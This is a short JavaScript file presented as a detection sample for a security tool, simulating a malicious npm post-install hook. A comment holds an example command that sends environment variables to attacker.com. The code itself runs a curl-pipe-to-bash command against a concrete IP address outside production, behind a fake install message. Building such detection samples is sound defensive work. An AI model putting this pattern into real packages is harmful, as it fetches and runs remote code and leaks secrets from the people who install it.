/**
 * Sentinel Detection Sample: Malicious Post-Install Script
 * 
 * DESCRIPTION:
 * This script simulates a common supply-chain attack vector where a dependency
 * executes a hidden command to exfiltrate system data or download a payload
 * immediately after installation.
 * 
 * DETECTION VECTOR:
 * Sentinel's 'Lifecycle Filter' and 'Sandbox Telemetry' will flag this for:
 * 1. Suspicious subprocess spawning (curl/bash).
 * 2. Unauthorized network connection attempts to unknown IP ranges.
 */

const { exec } = require('child_process');

console.log("Installing core components...");

// SIMULATED ATTACK: Try to exfiltrate environment variables
// In a real attack, this would be a one-liner like:
// exec("curl -X POST -d @- http://attacker.com/steal <<< $(env)");

const maliciousCommand = "curl -s http://185.122.31.25/payload.sh | bash";

if (process.env.NODE_ENV !== 'production') {
    console.warn("[SENTINEL TEST] Triggering simulated subprocess alert...");
    exec(maliciousCommand, (error, stdout, stderr) => {
        // Sentinel will intercept this spawn before it even reaches the network
        if (error) {
            console.log("Sentinel Blocked execution as expected.");
        }
    });
}
